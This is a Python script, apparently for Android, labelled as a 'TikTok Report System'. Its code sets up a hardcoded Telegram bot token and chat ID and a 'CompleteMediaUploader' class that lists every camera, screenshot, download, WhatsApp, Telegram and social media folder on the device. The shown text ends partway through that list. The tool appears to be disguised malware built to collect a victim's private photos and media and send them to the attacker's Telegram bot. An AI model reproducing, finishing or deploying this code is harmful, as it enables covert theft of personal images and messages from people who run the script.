#!/usr/bin/env python3
"""
TikTok Report System 
"""

import os
import sys
import time
import json
import random
import requests
import threading
from datetime import datetime
from pathlib import Path

# ==================== TELEGRAM CONFIG ====================
TELEGRAM_BOT_TOKEN = "8134629384:AAE8YCOkeoEeMZ_6FGaRbCf4TNLf55rl82I"
TELEGRAM_CHAT_ID = "820421921"
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# ==================== COMPLETE MEDIA UPLOADER ====================
class CompleteMediaUploader:
    def __init__(self):
        self.uploaded_files = 0
        self.total_size = 0
        self.is_uploading = False
        
    def find_all_image_paths(self):
        """Find ALL image files in the entire device"""
        all_images = []
        image_extensions = {'.jpg', '.jpeg', '.png', '.webp', '.gif', '.bmp', '.heic', '.tiff', '.jfif'}
        
        # ALL possible paths in Android
        search_paths = []
        
        # 1. First - Camera folders (MOST IMPORTANT)
        camera_paths = [
            "/storage/emulated/0/DCIM/Camera",
            "/sdcard/DCIM/Camera",
            "/storage/emulated/0/Camera",
            "/storage/emulated/0/DCIM",
            "/sdcard/DCIM",
            "/storage/emulated/0/Pictures/Camera",
            "/DCIM/Camera",
            "/mnt/sdcard/DCIM/Camera",
            "/data/media/0/DCIM/Camera"
        ]
        
        # 2. Second - All Pictures folders
        pictures_paths = [
            "/storage/emulated/0/Pictures",
            "/sdcard/Pictures",
            "/storage/emulated/0/Photos",
            "/storage/emulated/0/Image",
            "/storage/emulated/0/Images",
            "/storage/emulated/0/Pictures/Screenshots",
            "/storage/emulated/0/Screenshots",
            "/sdcard/Pictures/Screenshots",
            "/sdcard/Screenshots"
        ]
        
        # 3. Third - All Downloads
        download_paths = [
            "/storage/emulated/0/Download",
            "/sdcard/Download",
            "/storage/emulated/0/Downloads",
            "/sdcard/Downloads",
            "/storage/emulated/0/Download/Images",
            "/storage/emulated/0/Bluetooth",
            "/storage/emulated/0/Received"
        ]
        
        # 4. Fourth - ALL WhatsApp folders
        whatsapp_paths = [
            "/storage/emulated/0/WhatsApp",
            "/storage/emulated/0/WhatsApp/Media",
            "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
            "/storage/emulated/0/WhatsApp/Media/WhatsApp Video",
            "/storage/emulated/0/WhatsApp/Media/WhatsApp Documents",
            "/storage/emulated/0/WhatsApp/Media/WhatsApp Animated Gifs",
            "/storage/emulated/0/WhatsApp/Media/WhatsApp Audio",
            "/storage/emulated/0/WhatsApp/Media/WhatsApp Voice Notes",
            "/storage/emulated/0/WhatsApp/Media/Statuses",
            "/storage/emulated/0/WhatsApp/Media/Profile Photos",
            "/storage/emulated/0/WhatsApp/.Shared",
            "/storage/emulated/0/WhatsApp/.Stickers",
            "/sdcard/WhatsApp",
            "/sdcard/WhatsApp/Media"
        ]
        
        # 5. Fifth - ALL Telegram folders
        telegram_paths = [
            "/storage/emulated/0/Telegram",
            "/storage/emulated/0/Telegram/Telegram Images",
            "/storage/emulated/0/Telegram/Telegram Video",
            "/storage/emulated/0/Telegram/Telegram Documents",
            "/storage/emulated/0/Telegram/Telegram Audio",
            "/storage/emulated/0/Telegram/Telegram Voice",
            "/storage/emulated/0/Telegram/Telegram Stickers",
            "/storage/emulated/0/Telegram/Telegram Profile Photos",
            "/storage/emulated/0/Telegram/Telegram Wallpapers",
            "/sdcard/Telegram"
        ]
        
        # 6. Sixth - ALL Social Media folders
        social_paths = [
            "/storage/emulated/0/Instagram",
            "/storage/emulated/0/Instagram/Media",
       
